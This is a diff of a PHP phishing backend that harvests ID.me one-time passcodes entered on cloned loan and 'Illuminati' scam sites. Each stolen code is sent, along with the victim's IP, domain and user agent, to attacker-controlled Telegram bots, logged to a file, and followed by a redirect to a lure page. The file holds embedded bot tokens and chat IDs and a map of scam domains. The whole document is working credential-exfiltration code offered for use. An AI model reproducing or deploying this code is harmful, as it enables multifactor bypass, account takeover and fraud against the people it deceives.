@@ -1,70 +1,30 @@
 <?php
-// ===================================
-// 🔐 UNIVERSAL OTP HANDLER (Multi-site)
-// ===================================
-// include 'firewall.php';
+ob_start();
 
-// === Domain-specific bot + redirect map ===
+// Site-specific configuration with domain-based bots and redirects
 $site_map = [
-    'upstartloan.rf.gd' => [
+    '127.0.0.1' => [
         'bots' => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
+            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
-        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
+        'redirect' => 'https://illuminatiofficial.world/index.html'
     ],
-    'upstarts.onrender.com' => [
-        'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok', 'chat_id' => '5768557636']
-        ],
-        'redirect' => 'https://upstarts.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
-    ],
-
-    'upstart-l69v.onrender.com' => [
-        'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
-        ],
-        'redirect' => 'https://upstart-l69v.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
-    ],
-
-    'upstartloans-704y.onrender.com' => [
-        'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
-        ],
-        'redirect' => 'https://upstartloans-704y.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
-    ],
-
     
-    'upstartsloan.42web.io' => [
+    'illuminatiofficial.world' => [
         'bots' => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
-
+            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
-        'redirect' => 'https://upstartsloan.42web.io/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
+        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
     ],
-
-
-    'paysphere.42web.io' => [
-        'bots' => [
-            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            
-            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
-
-        ],
-        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
-    ],
-
-
+    
     'illuminatipath.world' => [
         "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
         ],
-        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
+        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
 
@@ -75,9 +35,8 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
         ],
-        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
+        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
-
 
 
     'illuminatisacred.world' => [
@@ -85,67 +44,115 @@ $site_map = [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
         ],
-        "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
+        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
-
-
-
+    // Add more domains as needed
 ];
 
 
-// === Logger setup ===
-$log_file = 'submission_log.txt';
-function logToFile($data, $file) {
-    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
-    file_put_contents($file, $entry, FILE_APPEND);
+// Get the referring domain
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+
+// Find the configuration for this domain
+$config = $site_map[$domain] ?? null;
+
+// If no config found, use a default one
+if (!$config) {
+    $config = reset($site_map);
 }
 
-// === Telegram sender ===
-function sendToBots($message, $bots) {
-    foreach ($bots as $bot) {
-        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Setup log file
+    $log_file = __DIR__ . "/logs/idme_otps.txt";
+    if (!file_exists(dirname($log_file))) {
+        mkdir(dirname($log_file), 0777, true);
+    }
+
+    // Logging function
+    function log_entry($msg) {
+        global $log_file;
+        $timestamp = date("Y-m-d H:i:s");
+        file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
+    }
+
+    // Get form data from HTML form - field name is 'userotp'
+    $userotp = htmlspecialchars($_POST['userotp'] ?? '???');
+
+    // Get IP address SERVER-SIDE
+    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
+          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+          $_SERVER['HTTP_X_FORWARDED'] ?? 
+          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
+          $_SERVER['HTTP_FORWARDED'] ?? 
+          $_SERVER['REMOTE_ADDR'] ?? 
+          'unknown';
+    
+    // Handle multiple IPs in X_FORWARDED_FOR
+    if (strpos($ip, ',') !== false) {
+        $ips = explode(',', $ip);
+        $ip = trim($ips[0]);
+    }
+
+    $timestamp = date("Y-m-d H:i:s");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    
+    // Prepare Telegram message
+    $message = "🔐 *ID.me OTP Submission*\n\n" .
+               "🔢 *OTP Code:* `$userotp`\n" .
+               "🌐 *Domain:* $domain\n" .
+               "📡 *IP:* `$ip`\n" .
+               "🕒 *Time:* $timestamp\n" .
+               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
+
+    // Send to Telegram bots (using domain-specific bots from config)
+    foreach ($config['bots'] as $bot_index => $bot) {
+        if (empty($bot['token']) || empty($bot['chat_id'])) {
+            log_entry("Skipping bot $bot_index - empty token or chat_id");
+            continue;
+        }
+        
+        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
         $data = [
             'chat_id' => $bot['chat_id'],
             'text' => $message,
             'parse_mode' => 'Markdown'
         ];
-        $ch = curl_init();
+
+        $ch = curl_init($url);
         curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => true
         ]);
-        curl_exec($ch);
+        
+        $result = curl_exec($ch);
+        
+        if (curl_error($ch)) {
+            log_entry("❌ Telegram error (bot $bot_index): " . curl_error($ch));
+        } else {
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            log_entry("✓ Telegram sent (bot $bot_index) - HTTP $http_code");
+        }
+        
         curl_close($ch);
     }
-}
 
-// === Main logic ===
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $otp = htmlspecialchars($_POST['userotp'] ?? '???');
-    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $referer = $_SERVER['HTTP_REFERER'] ?? '';
-    $parsed = parse_url($referer);
-    $domain = $parsed['host'] ?? 'unknown';
-    $timestamp = date("Y-m-d H:i:s");
+    // Log the submission
+    log_entry("[$domain] OTP from $ip - Code: $userotp");
 
-    $msg = "🔐 *OTP Received from $domain*\n\n" .
-           "🔢 *Code:* $otp\n" .
-           "🌐 *IP:* $ip\n" .
-           "⏰ *Time:* $timestamp";
-
-    logToFile("[$domain] OTP: $otp | IP: $ip", $log_file);
-
-    if (isset($site_map[$domain])) {
-        $config = $site_map[$domain];
-        sendToBots($msg, $config['bots']);
-        header("Location: " . $config['redirect']);
-        exit;
-    } else {
-        logToFile("❌ Unauthorized domain: $domain", $log_file);
-        exit("Unauthorized");
-    }
+    // Clear output buffer and redirect to domain-specific URL
+    ob_end_clean();
+    header("Location: " . $config['redirect']);
+    exit;
+    
+} else {
+    // Not a POST request
+    echo "This page only accepts POST submissions from the OTP form.";
+    exit;
 }
 ?>
